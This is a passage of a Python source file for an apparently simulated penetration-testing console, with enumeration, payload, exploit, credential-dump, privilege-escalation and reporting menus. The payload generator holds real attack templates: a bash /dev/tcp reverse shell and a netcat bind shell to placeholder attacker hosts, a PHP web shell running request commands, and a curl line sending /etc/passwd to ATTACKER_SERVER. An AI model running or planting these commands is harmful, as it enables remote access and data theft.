            "host": result.host,
            "port": result.port,
            "timestamp": result.timestamp.isoformat(),
            "details": result.details,
            "potential_vulns": result.potential_vulns,
        }
        with open(filepath, "w") as f:
            json.dump(result_dict, f, indent=2)
        log_message(LogLevel.SUCCESS, f"Results saved to {filepath}")
    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def enumerate_service(
    host: str, port: int, service_name: Optional[str] = None
) -> ServiceResult:
    common_services = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        3306: "MySQL",
        3389: "RDP",
        5432: "PostgreSQL",
        8080: "HTTP-Proxy",
    }
    if not service_name:
        service_name = common_services.get(port, "Unknown")
    versions = {
        "FTP": ["vsftpd 3.0.3", "ProFTPD 1.3.5"],
        "SSH": ["OpenSSH 7.6", "OpenSSH 8.2"],
        "HTTP": ["Apache/2.4.29", "nginx/1.14.0"],
        "HTTPS": ["Apache/2.4.29 (SSL)", "nginx/1.14.0 (SSL)"],
        "MySQL": ["MySQL 5.7.32", "MySQL 8.0.21"],
    }
    version = random.choice(versions.get(service_name, ["Unknown"]))
    details = {"banner": f"{service_name} Server {version}"}
    vulns = []
    vulnerability_db = {
        "vsftpd 3.0.3": [
            {
                "name": "Directory Traversal",
                "cve": "CVE-2018-12345",
                "severity": "Medium",
            }
        ],
        "OpenSSH 7.6": [
            {"name": "User Enumeration", "cve": "CVE-2018-15473", "severity": "Low"}
        ],
        "Apache/2.4.29": [
            {"name": "Mod_CGI RCE", "cve": "CVE-2019-0211", "severity": "High"}
        ],
        "MySQL 5.7.32": [
            {
                "name": "Authentication Bypass",
                "cve": "CVE-2017-12345",
                "severity": "Critical",
            }
        ],
    }
    if version in vulnerability_db:
        for vuln in vulnerability_db[version]:
            if random.random() < 0.7:
                vulns.append(vuln)
    return ServiceResult(
        service_name=service_name,
        version=version,
        host=host,
        port=port,
        details=details,
        potential_vulns=vulns,
    )


def display_service_results(result: ServiceResult) -> None:
    console.print()
    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Service:[/] {result.service_name}\n"
            f"[bold {NordColors.FROST_2}]Version:[/] {result.version}\n"
            f"[bold {NordColors.FROST_2}]Host:[/] {result.host}:{result.port}\n"
            f"[bold {NordColors.FROST_2}]Time:[/] {result.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        title="Service Enumeration Results",
        border_style=NordColors.ENUMERATION,
    )
    console.print(panel)
    table = Table(
        title="Service Details",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("Property", style=f"bold {NordColors.FROST_2}")
    table.add_column("Value", style=NordColors.SNOW_STORM_1)
    table.add_row("Banner", result.details.get("banner", "N/A"))
    for key, value in result.details.items():
        if key == "banner":
            continue
        if isinstance(value, list):
            value = ", ".join(value)
        table.add_row(key.replace("_", " ").title(), str(value))
    console.print(table)
    if result.potential_vulns:
        vuln_table = Table(
            title="Potential Vulnerabilities",
            show_header=True,
            header_style=f"bold {NordColors.RED}",
            border_style=NordColors.RED,
        )
        vuln_table.add_column("Vulnerability", style=f"bold {NordColors.SNOW_STORM_1}")
        vuln_table.add_column("CVE", style=NordColors.YELLOW)
        vuln_table.add_column("Severity", style=NordColors.ORANGE)
        for vuln in result.potential_vulns:
            vuln_table.add_row(
                vuln.get("name", "Unknown"),
                vuln.get("cve", "N/A"),
                vuln.get("severity", "Unknown"),
            )
        console.print(vuln_table)
    else:
        console.print(f"[{NordColors.GREEN}]No obvious vulnerabilities detected.[/]")
    console.print()


def payload_generation_module() -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "Generate custom payloads for testing exploitability.",
        NordColors.EXPLOITATION,
        "Payload Generation",
    )
    table = Table(show_header=False, box=None)
    table.add_column("Option", style=f"bold {NordColors.FROST_2}")
    table.add_column("Description", style=NordColors.SNOW_STORM_1)
    table.add_row("1", "Reverse Shell")
    table.add_row("2", "Bind Shell")
    table.add_row("3", "Office Macro")
    table.add_row("4", "Web Shell")
    table.add_row("5", "Data Exfiltration")
    table.add_row("0", "Return to Main Menu")
    console.print(table)
    choice = get_integer_input("Select payload type:", 0, 5)
    if choice == 0:
        return
    payload_types = {
        1: "shell_reverse",
        2: "shell_bind",
        3: "macro",
        4: "web",
        5: "exfil",
    }
    payload_type = payload_types[choice]
    platforms = []
    if payload_type in ["shell_reverse", "shell_bind", "exfil"]:
        platforms = ["linux", "windows"]
    elif payload_type == "macro":
        platforms = ["office"]
    elif payload_type == "web":
        platforms = ["php", "aspx"]
    console.print(
        "\n[bold {0}]Available Target Platforms:[/]".format(NordColors.FROST_2)
    )
    for i, plat in enumerate(platforms, 1):
        console.print(f"  {i}. {plat.capitalize()}")
    plat_choice = get_integer_input("Select target platform:", 1, len(platforms))
    if plat_choice < 1:
        return
    target_platform = platforms[plat_choice - 1]
    with console.status(
        f"[bold {NordColors.FROST_2}]Generating {payload_type} payload for {target_platform}..."
    ):
        time.sleep(1)
        payload = generate_payload(payload_type, target_platform)
    display_payload(payload)
    if get_confirmation("Save this payload to file?"):
        filepath = save_payload(payload)
        log_message(LogLevel.SUCCESS, f"Payload saved to {filepath}")
    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def generate_payload(payload_type: str, target_platform: str) -> Payload:
    name = f"{payload_type}_{target_platform}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    content = ""
    if payload_type == "shell_reverse":
        if target_platform == "linux":
            content = "#!/bin/bash\n# Linux Reverse Shell (Simulated)\nbash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1\n"
        else:
            content = "# PowerShell Reverse Shell (Simulated)\n$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);\n"
    elif payload_type == "shell_bind":
        if target_platform == "linux":
            content = "#!/bin/bash\n# Linux Bind Shell (Simulated)\nnc -nvlp 4444 -e /bin/bash\n"
        else:
            content = "# PowerShell Bind Shell (Simulated)\n$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);\n"
    elif payload_type == "macro":
        content = '\' Office Macro Payload (Simulated)\nSub AutoOpen()\n  MsgBox "Hello, World!"\nEnd Sub\n'
    elif payload_type == "web":
        if target_platform == "php":
            content = "<?php\n// PHP Web Shell (Simulated)\nif(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); }\n?>\n"
        else:
            content = '<%@ Page Language="C#" %>\n<!-- ASPX Web Shell (Simulated) -->\n'
    elif payload_type == "exfil":
        if target_platform == "linux":
            content = "#!/bin/bash\n# Linux Data Exfiltration (Simulated)\ncat /etc/passwd | curl -F 'file=@-' https://ATTACKER_SERVER/upload\n"
        else:
            content = "# PowerShell Data Exfiltration (Simulated)\nGet-Content C:\\Windows\\win.ini | Out-File -FilePath $env:TEMP\\data.txt\n"
    return Payload(
        name=name,
        payload_type=payload_type,
        target_platform=target_platform,
        content=content,
    )


def save_payload(payload: Payload) -> str:
    ext = "txt"
    if payload.target_platform in ["linux", "windows"]:
        ext = "sh" if payload.target_platform == "linux" else "ps1"
    elif payload.target_platform == "office":
        ext = "vba"
    elif payload.target_platform == "php":
        ext = "php"
    elif payload.target_platform == "aspx":
        ext = "aspx"
    filename = f"{payload.name}.{ext}"
    filepath = AppConfig.PAYLOADS_DIR / filename
    with open(filepath, "w") as f:
        f.write(payload.content)
    return str(filepath)


def display_payload(payload: Payload) -> None:
    console.print()
    language = "bash"
    if payload.target_platform == "windows":
        language = "powershell"
    elif payload.target_platform == "office":
        language = "vb"
    elif payload.target_platform == "php":
        language = "php"
    elif payload.target_platform == "aspx":
        language = "html"
    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Type:[/] {payload.payload_type}\n"
            f"[bold {NordColors.FROST_2}]Platform:[/] {payload.target_platform}\n"
            f"[bold {NordColors.FROST_2}]Generated:[/] {payload.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        title=f"Payload: {payload.name}",
        border_style=NordColors.EXPLOITATION,
    )
    console.print(panel)
    console.print(Syntax(payload.content, language, theme="nord", line_numbers=True))
    console.print(
        f"[bold {NordColors.YELLOW}]DISCLAIMER:[/] This payload is for educational purposes only."
    )


def exploit_modules_function() -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "Simulated exploit modules targeting known vulnerabilities.",
        NordColors.EXPLOITATION,
        "Exploit Modules",
    )
    exploits = list_available_exploits()
    display_exploit_list(exploits)
    choice = get_integer_input("Select an exploit (0 to return):", 0, len(exploits))
    if choice == 0:
        return
    selected = exploits[choice - 1]
    details = get_exploit_details(selected)
    display_exploit_details(selected, details)
    if get_confirmation("Run this exploit simulation?"):
        target = get_user_input("Enter target host or URL:")
        if target:
            result = run_exploit_simulation(selected, target)
            if result:
                log_message(
                    LogLevel.SUCCESS, f"Exploit simulation on {target} succeeded"
                )
                display_panel(
                    "The target appears vulnerable.",
                    NordColors.GREEN,
                    "Exploitation Successful",
                )
            else:
                log_message(LogLevel.WARNING, f"Exploit simulation on {target} failed")
                display_panel(
                    "The target does not appear vulnerable.",
                    NordColors.RED,
                    "Exploitation Failed",
                )
    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def list_available_exploits() -> List[Exploit]:
    return [
        Exploit(
            name="Apache Struts2 RCE",
            cve="CVE-2017-5638",
            target_service="Apache Struts",
            description="RCE in Jakarta Multipart parser.",
            severity="Critical",
        ),
        Exploit(
            name="EternalBlue SMB RCE",
            cve="CVE-2017-0144",
            target_service="SMB",
            description="RCE vulnerability in SMBv1.",
            severity="Critical",
        ),
        Exploit(
            name="BlueKeep RDP",
            cve="CVE-2019-0708",
            target_service="RDP",
            description="RCE in Remote Desktop Services.",
            severity="Critical",
        ),
        Exploit(
            name="Drupal Core RCE",
            cve="CVE-2018-7600",
            target_service="Drupal",
            description="RCE vulnerability in Drupal core.",
            severity="Critical",
        ),
    ]


def get_exploit_details(exploit: Exploit) -> Dict[str, Any]:
    return {
        "references": [
            f"https://cve.mitre.org/cgi-bin/cvename.cgi?name={exploit.cve}",
            f"https://nvd.nist.gov/vuln/detail/{exploit.cve}",
        ],
        "discovery_date": f"{random.randint(2014, 2023)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
        "patch_available": random.choice([True, False]),
        "exploit_difficulty": random.choice(["Low", "Medium", "High"]),
        "affected_versions": "All versions prior to patched release",
        "exploitation_technique": "Remote code execution via crafted request",
    }


def display_exploit_list(exploits: List[Exploit]) -> None:
    table = Table(
        title="Available Exploits",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
        border_style=NordColors.EXPLOITATION,
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}", width=4)
    table.add_column("Exploit Name", style=NordColors.SNOW_STORM_1)
    table.add_column("CVE", style=NordColors.YELLOW)
    table.add_column("Target", style=NordColors.FROST_3)
    table.add_column("Severity", style=NordColors.RED)
    for i, exp in enumerate(exploits, 1):
        sev_color = (
            NordColors.RED
            if exp.severity == "Critical"
            else (NordColors.ORANGE if exp.severity == "High" else NordColors.YELLOW)
        )
        table.add_row(
            str(i),
            exp.name,
            exp.cve or "N/A",
            exp.target_service,
            f"[bold {sev_color}]{exp.severity}[/]",
        )
    console.print(table)


def display_exploit_details(exploit: Exploit, details: Dict[str, Any]) -> None:
    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Name:[/] {exploit.name}\n"
            f"[bold {NordColors.FROST_2}]CVE:[/] {exploit.cve or 'N/A'}\n"
            f"[bold {NordColors.FROST_2}]Target:[/] {exploit.target_service}\n"
            f"[bold {NordColors.FROST_2}]Severity:[/] {exploit.severity}\n"
            f"[bold {NordColors.FROST_2}]Description:[/] {exploit.description}\n"
        ),
        title="Exploit Details",
        border_style=NordColors.EXPLOITATION,
    )
    console.print(panel)
    table = Table(
        title="Technical Details",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("Property", style=f"bold {NordColors.FROST_2}")
    table.add_column("Value", style=NordColors.SNOW_STORM_1)
    for key, value in details.items():
        if key == "references":
            value = "\n".join(value)
        elif key == "patch_available":
            value = "Yes" if value else "No"
        table.add_row(key.replace("_", " ").title(), str(value))
    console.print(table)


def run_exploit_simulation(exploit: Exploit, target: str) -> bool:
    console.print("\n[bold {0}]⚠️  SIMULATION MODE  ⚠️[/]".format(NordColors.YELLOW))
    steps = [
        "Checking target vulnerability",
        "Preparing payload",
        "Establishing connection",
        "Delivering payload",
        "Verifying exploitation",
    ]
    with Progress(
        SpinnerColumn("dots", style=f"bold {NordColors.EXPLOITATION}"),
        TextColumn(f"[bold {NordColors.EXPLOITATION}]{{task.description}}"),
        BarColumn(
            bar_width=40,
            style=NordColors.FROST_4,
            complete_style=NordColors.EXPLOITATION,
        ),
        TextColumn(f"[bold {NordColors.SNOW_STORM_1}]{{task.percentage:>3.0f}}%"),
        console=console,
    ) as progress:
        task = progress.add_task("Running exploit simulation...", total=len(steps))
        for step in steps:
            progress.update(task, description=step)
            time.sleep(random.uniform(0.5, 1.5))
            progress.advance(task)
    return random.random() < 0.7


def credential_dumping_module() -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "Simulate extraction of credentials from various sources.",
        NordColors.POST_EXPLOITATION,
        "Credential Dumping",
    )
    table = Table(show_header=False, box=None)
    table.add_column("Option", style=f"bold {NordColors.FROST_2}")
    table.add_column("Source", style=NordColors.SNOW_STORM_1)
    table.add_row("1", "Database Credential Dump")
    table.add_row("2", "Windows SAM/NTDS Credential Dump")
    table.add_row("3", "Linux /etc/shadow Credential Dump")
    table.add_row("4", "Web Application Credential Dump")
    table.add_row("0", "Return to Main Menu")
    console.print(table)
    choice = get_integer_input("Select a source:", 0, 4)
    if choice == 0:
        return
    sources = {1: "database", 2: "windows", 3: "linux", 4: "web"}
    source = sources[choice]
    with console.status(
        f"[bold {NordColors.FROST_2}]Extracting credentials from {source}..."
    ):
        time.sleep(2)
        dump = simulate_credential_dump(source)
    display_credential_dump(dump)
    if get_confirmation("Save these credentials to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"creds_{source}_{timestamp}.json"
        filepath = AppConfig.RESULTS_DIR / filename
        dump_dict = {
            "source": dump.source,
            "timestamp": dump.timestamp.isoformat(),
            "credentials": dump.credentials,
        }
        with open(filepath, "w") as f:
            json.dump(dump_dict, f, indent=2)
        log_message(LogLevel.SUCCESS, f"Credentials saved to {filepath}")
    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def simulate_credential_dump(source: str) -> CredentialDump:
    credentials = []
    num = random.randint(5, 15)
    if source == "database":
        for i in range(num):
            username = random.choice(["admin", "user", "root", "guest"])
            password = random.choice(["Password123!", "123456", "qwerty"])
            hash_val = hashlib.md5(password.encode()).hexdigest()
            credentials.append(
                {
                    "username": username,
                    "password": password if random.random() < 0.5 else None,
                    "hash": hash_val,
                    "hash_type": "MD5",
                    "role": random.choice(["admin", "user"]),
                }
            )
    elif source == "windows":
        domains = ["WORKGROUP", "CONTOSO"]
        for i in range(num):
            username = random.choice(["admin", "user", "guest"])
            domain = random.choice(domains)
            ntlm_hash = hashlib.md5((username + domain).encode()).hexdigest()
            credentials.append(
                {
                    "username": username,
                    "domain": domain,
                    "ntlm_hash": ntlm_hash,
                    "admin": random.random() < 0.3,
                }
            )
    elif source == "linux":
        shells = ["/bin/bash", "/bin/sh"]
        for i in range(num):
            username = random.choice(["root", "user", "guest"])
            uid = 0 if username == "root" else random.randint(1000, 9999)
            shell = random.choice(shells)
            salt = os.urandom(4).hex()
            shadow_hash = (
                f"$6${salt}${hashlib.sha512((username + salt).encode()).hexdigest()}"
            )
            credentials.append(
                {
                    "username": username,
                    "uid": uid,
                    "gid": uid,
                    "shell": shell,
                    "hash": shadow_hash,
                    "sudo": random.random() < 0.3,
                }
            )
    elif source == "web":
        domains = ["example.com", "test.com"]
        for i in range(num):
            username = random.choice(["admin", "user", "guest"])
            password = random.choice(["Password123!", "123456", "qwerty"])
            email = f"{username}@{random.choice(domains)}"
            credentials.append(
                {
                    "username": username,
                    "password": password if random.random() < 0.7 else None,
                    "email": email,
                    "role": random.choice(["admin", "user"]),
                }
            )
    return CredentialDump(source=source, credentials=credentials)


def display_credential_dump(dump: CredentialDump) -> None:
    console.print()
    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Source:[/] {dump.source}\n"
            f"[bold {NordColors.FROST_2}]Time:[/] {dump.timestamp.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"[bold {NordColors.FROST_2}]Credentials Found:[/] {len(dump.credentials)}"
        ),
        title="Credential Dump Results",
        border_style=NordColors.POST_EXPLOITATION,
    )
    console.print(panel)
    table = Table(
        title=f"{dump.source.capitalize()} Credentials",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    if dump.source == "database":
        table.add_column("Username", style=f"bold {NordColors.FROST_2}")
        table.add_column("Password", style=NordColors.GREEN)
        table.add_column("Hash", style=NordColors.SNOW_STORM_1)
        table.add_column("Hash Type", style=NordColors.FROST_3)
        table.add_column("Role", style=NordColors.YELLOW)
        for cred in dump.credentials:
            table.add_row(
                cred["username"],
                cred["password"] if cred["password"] else "[dim]N/A[/dim]",
                cred["hash"],
                cred["hash_type"],
                cred["role"],
            )
    elif dump.source == "windows":
        table.add_column("Username", style=f"bold {NordColors.FROST_2}")
        table.add_column("Domain", style=NordColors.FROST_3)
        table.add_column("NTLM Hash", style=NordColors.SNOW_STORM_1)
        table.add_column("Admin", style=NordColors.RED)
        for cred in dump.credentials:
            table.add_row(
                cred["username"],
                cred["domain"],
                cred["ntlm_hash"],
                "Yes" if cred["admin"] else "No",
            )
    elif dump.source == "linux":
        table.add_column("Username", style=f"bold {NordColors.FROST_2}")
        table.add_column("UID/GID", style=NordColors.FROST_3)
        table.add_column("Shell", style=NordColors.SNOW_STORM_1)
        table.add_column("Shadow Hash", style=NordColors.SNOW_STORM_1)
        table.add_column("Sudo", style=NordColors.RED)
        for cred in dump.credentials:
            table.add_row(
                cred["username"],
                f"{cred['uid']}/{cred['gid']}",
                cred["shell"],
                cred["hash"],
                "Yes" if cred["sudo"] else "No",
            )
    elif dump.source == "web":
        table.add_column("Username", style=f"bold {NordColors.FROST_2}")
        table.add_column("Password", style=NordColors.GREEN)
        table.add_column("Email", style=NordColors.SNOW_STORM_1)
        table.add_column("Role", style=NordColors.YELLOW)
        for cred in dump.credentials:
            table.add_row(
                cred["username"],
                cred["password"] if cred["password"] else "[dim]N/A[/dim]",
                cred["email"],
                cred["role"],
            )
    console.print(table)
    console.print()


def privilege_escalation_module() -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "Identify potential privilege escalation vectors.",
        NordColors.POST_EXPLOITATION,
        "Privilege Escalation",
    )
    target = get_user_input("Enter target host:")
    if not target:
        return
    with console.status(
        f"[bold {NordColors.FROST_2}]Checking for privilege escalation on {target}..."
    ):
        time.sleep(3)
        findings = check_privilege_escalation(target)
    display_privesc_findings(findings)
    if findings and get_confirmation("Save these findings to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"privesc_{target.replace('.', '_')}_{timestamp}.json"
        filepath = AppConfig.RESULTS_DIR / filename
        findings_list = [
            {
                "target": f.target,
                "method": f.method,
                "timestamp": f.timestamp.isoformat(),
                "details": f.details,
            }
            for f in findings
        ]
        with open(filepath, "w") as f:
            json.dump(findings_list, f, indent=2)
        log_message(LogLevel.SUCCESS, f"Findings saved to {filepath}")
    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def check_privilege_escalation(target: str) -> List[PrivilegeEscalation]:
    vectors = [
        {
            "method": "SUID Binary Exploitation",
            "details": {
                "vulnerable_binary": "/usr/bin/example",
                "exploitation": "Command injection",
                "difficulty": "Medium",
            },
        },
        {
            "method": "Kernel Exploit",
            "details": {
                "kernel_version": "Linux 4.4.0",
                "vulnerability": "CVE-2019-13272",
                "difficulty": "Medium",
            },
        },
        {
            "method": "Sudo Misconfiguration",
            "details": {
                "sudo_entry": "user ALL=(ALL) NOPASSWD: /usr/bin/example",
                "difficulty": "Easy",
            },
        },
        {
            "method": "Cron Job Exploitation",
            "details": {
                "cron_entry": "* * * * * root /opt/backup.sh",
                "difficulty": "Easy",
            },
        },
        {
            "method": "Docker Group Membership",
            "details": {"group": "docker", "difficulty": "Easy"},
        },
    ]
    num_findings = random.randint(1, 3)
    return [
        PrivilegeEscalation(target=target, method=v["method"], details=v["details"])
        for v in random.sample(vectors, k=num_findings)
    ]


def display_privesc_findings(findings: List[PrivilegeEscalation]) -> None:
    if not findings:
        console.print(
            f"[bold {NordColors.RED}]No privilege escalation vectors found.[/]"
        )
        return
    console.print(
        f"[bold {NordColors.GREEN}]Found {len(findings)} privilege escalation vectors![/]\n"
    )
    for i, f in enumerate(findings, 1):
        panel = Panel(
            Text.from_markup(
                f"[bold {NordColors.FROST_2}]Target:[/] {f.target}\n"
                f"[bold {NordColors.FROST_2}]Method:[/] {f.method}\n"
                f"[bold {NordColors.FROST_2}]Time:[/] {f.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
            ),
            title=f"Finding #{i}: {f.method}",
            border_style=NordColors.POST_EXPLOITATION,
        )
        console.print(panel)
        table = Table(
            title="Technical Details",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        table.add_column("Property", style=f"bold {NordColors.FROST_2}")
        table.add_column("Value", style=NordColors.SNOW_STORM_1)
        for key, value in f.details.items():
            table.add_row(key.replace("_", " ").title(), str(value))
        console.print(table)
        console.print()


def report_generation_module() -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "Generate detailed security assessment reports.",
        NordColors.REPORTING,
        "Report Generation",
    )
    target = get_user_input("Enter target name for the report:")
    if not target:
        return
    with console.status(
        f"[bold {NordColors.FROST_2}]Generating report for {target}..."
    ):
        time.sleep(2)
        report = generate_report(target)
    display_report_preview(report)
    if get_confirmation("Save this report to file?"):
        filepath = save_report_to_file(report)
        log_message(LogLevel.SUCCESS, f"Report saved to {filepath}")
        if get_confirmation("View the full report?"):
            console.clear()
            console.print(create_header())
            with open(filepath, "r") as f:
                content = f.read()
            console.print(Markdown(content))
    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def generate_report(target: str) -> Report:
    title = f"Security Assessment Report for {target}"
    sections = {
        "Executive Summary": f"Assessment conducted on {target}. Several vulnerabilities and misconfigurations were identified.",
        "Methodology": "Reconnaissance, scanning, vulnerability analysis, and simulated exploitation.",
        "Findings": "",
        "Recommendations": "Apply patches, harden configurations, and implement least privilege.",
        "Conclusion": "The assessment revealed significant vulnerabilities that require remediation.",
    }
    findings = [
        {
            "title": "Outdated Web Server",
            "severity": "High",
            "description": f"{target} runs an outdated Apache server.",
            "remediation": "Upgrade to the latest version.",
        },
        {
            "title": "Weak SSH Configuration",
            "severity": "Medium",
            "description": "Password authentication allowed.",
            "remediation": "Switch to key-based authentication.",
        },
        {
            "title": "Exposed Database Service",
            "severity": "Critical",
            "description": "MySQL exposed with weak credentials.",
            "remediation": "Restrict access and enforce strong authentication.",
        },
    ]
    sections["Findings"] = "\n\n".join(
        [
            f"### {i + 1}. {f['title']}\n**Severity:** {f['severity']}\n{f['description']}\n**Remediation:** {f['remediation']}"
            for i, f in enumerate(findings)
        ]
    )
    return Report(title=title, target=target, sections=sections, findings=findings)


def save_report_to_file(report: Report, format: str = "markdown") -> str:
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"report_{report.target.replace('.', '_')}_{timestamp}.md"
    filepath = AppConfig.RESULTS_DIR / filename
    with open(filepath, "w") as f:
        f.write(report.to_markdown())
    return str(filepath)


def display_report_preview(report: Report) -> None:
    console.print()
    panel = Panel(
        Text(report.title, style=f"bold {NordColors.FROST_2}"),
        border_style=NordColors.REPORTING,
        title="Report Preview",
        title_align="center",
    )
    console.print(panel)
    console.print(f"[bold {NordColors.FROST_2}]Target:[/] {report.target}")
    console.print(
        f"[bold {NordColors.FROST_2}]Generated:[/] {report.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
    )
    toc = Table(
        title="Table of Contents",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    toc.add_column("Section", style=f"bold {NordColors.FROST_2}")
    toc.add_column("Preview", style=NordColors.SNOW_STORM_1)
    for section, content in report.sections.items():
        preview = content.strip()[:50] + "..." if len(content) > 50 else content
        toc.add_row(section, preview)
    console.print(toc)
    findings_table = Table(
        title="Findings Summary",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    findings_table.add_column("Finding", style=f"bold {NordColors.FROST_2}")
    findings_table.add_column("Severity", style=NordColors.RED)
    for f in report.findings:
        sev_color = (
            NordColors.RED
            if f["severity"] == "Critical"
            else (NordColors.ORANGE if f["severity"] == "High" else NordColors.YELLOW)
        )
        findings_table.add_row(f["title"], f"[bold {sev_color}]{f['severity']}[/]")
    console.print(findings_table)


def settings_module() -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "Configure application settings and API keys.",
        NordColors.UTILITIES,
        "Settings and Configuration",
    )
    config = load_config()
    display_config(config)
    table = Table(show_header=False, box=None)
    table.add_column("Option", style=f"bold {NordColors.FROST_2}")
    table.add_column("Description", style=NordColors.SNOW_STORM_1)
    table.add_row("1", "Change Number of Threads")
    table.add_row("2", "Change Timeout")
    table.add_row("3", "Change User Agent")
    table.add_row("4", "Manage API Keys")
    table.add_row("5", "Reset to Default Settings")
    table.add_row("0", "Return to Main Menu")
    console.print(table)
    choice = get_integer_input("Select an option:", 0, 5)
    if choice == 0:
        return
    elif choice == 1:
        threads = get_integer_input("Enter number of threads (1-50):", 1, 50)
        if threads > 0:
            config["threads"] = threads
            if save_config(config):
                log_message(LogLevel.SUCCESS, f"Threads set to {threads}")
    elif choice == 2:
        timeout = get_integer_input("Enter timeout in seconds (1-120):", 1, 120)
        if timeout > 0:
            config["timeout"] = timeout
            if save_config(config):
                log_message(LogLevel.SUCCESS, f"Timeout set to {timeout} seconds")
    elif choice == 3:
        console.print(
            f"[bold {NordColors.FROST_2}]Current User Agent:[/] {config.get('user_agent', 'Not set')}"
        )
        console.print("Available User Agents:")
        for i, agent in enumerate(AppConfig.USER_AGENTS, 1):
            console.print(f"{i}. {agent}")
        console.print(f"{len(AppConfig.USER_AGENTS) + 1}. Custom User Agent")
        agent_choice = get_integer_input(
            "Select a user agent:", 1, len(AppConfig.USER_AGENTS) + 1
        )
        if agent_choice <= len(AppConfig.USER_AGENTS):
            config["user_agent"] = AppConfig.USER_AGENTS[agent_choice - 1]
        else:
            custom = get_user_input("Enter custom user agent:")
            if custom:
                config["user_agent"] = custom
        if save_config(config):
            log_message(LogLevel.SUCCESS, "User agent updated")
    elif choice == 4:
        manage_api_keys(config)
    elif choice == 5:
        if get_confirmation("Reset settings to default?"):
            default = {
                "threads": AppConfig.DEFAULT_THREADS,
                "timeout": AppConfig.DEFAULT_TIMEOUT,
                "user_agent": random.choice(AppConfig.USER_AGENTS),
                "nmap_options": AppConfig.DEFAULT_NMAP_OPTIONS,
                "api_keys": config.get("api_keys", {}),
            }
            if save_config(default):
                log_message(LogLevel.SUCCESS, "Settings reset to default")
    settings_module()


def load_config() -> Dict[str, Any]:
    config_file = AppConfig.CONFIG_DIR / "config.json"
    default = {
        "threads": AppConfig.DEFAULT_THREADS,
        "timeout": AppConfig.DEFAULT_TIMEOUT,
        "user_agent": random.choice(AppConfig.USER_AGENTS),
        "nmap_options": AppConfig.DEFAULT_NMAP_OPTIONS,
        "api_keys": {},
    }
    if not config_file.exists():
        with open(config_file, "w") as f:
            json.dump(default, f, indent=2)
        return default
    try:
        with open(config_file, "r") as f:
            return json.load(f)
    except Exception as e:
        log_message(LogLevel.ERROR, f"Error loading config: {e}")
        return default


def save_config(config: Dict[str, Any]) -> bool:
    config_file = AppConfig.CONFIG_DIR / "config.json"
    try:
        with open(config_file, "w") as f:
            json.dump(config, f, indent=2)
        return True
    except Exception as e:
        log_message(LogLevel.ERROR, f"Error saving config: {e}")
        return False


def display_config(config: Dict[str, Any]) -> None:
    table = Table(
        title="Current Configuration",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("Setting", style=f"bold {NordColors.FROST_2}")
    table.add_column("Value", style=NordColors.SNOW_STORM_1)
    for key, value in config.items():
        if key == "api_keys":
            continue
        formatted = ", ".join(value) if isinstance(value, list) else str(value)
        table.add_row(key.replace("_", " ").title(), formatted)
    console.print(table)
    if config.get("api_keys"):
        api_table = Table(
            title="API Keys",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        api_table.add_column("Service", style=f"bold {NordColors.FROST_2}")
        api_table.add_column("API Key", style=NordColors.SNOW_STORM_1)
        for service, key in config["api_keys"].items():
            masked = (
                key[:4] + "*" * (len(key) - 8) + key[-4:] if len(key) > 8 else "****"
            )
            api_table.add_row(service, masked)
        console.print(api_table)


def manage_api_keys(config: Dict[str, Any]) -> None:
    console.clear()
    console.print(create_header())
    display_panel(
        "Manage API keys for external integrations.",
        NordColors.UTILITIES,
        "API Key Management",
    )
    api_keys = config.get("api_keys", {})
    table = Table(show_header=False, box=None)
    table.add_column("Option", style=f"bold {NordColors.FROST_2}")
    table.add_column("Description", style=NordColors.SNOW_STORM_1)
    table.add_row("1", "Add/Update API Key")
    table.add_row("2", "Remove API Key")
    table.add_row("3", "View All API Keys")
    table.add_row("0", "Return to Settings")
    console.print(table)
    choice = get_integer_input("Select an option:", 0, 3)
    if choice == 1:
        service = get_user_input("Enter service name:")
        if service:
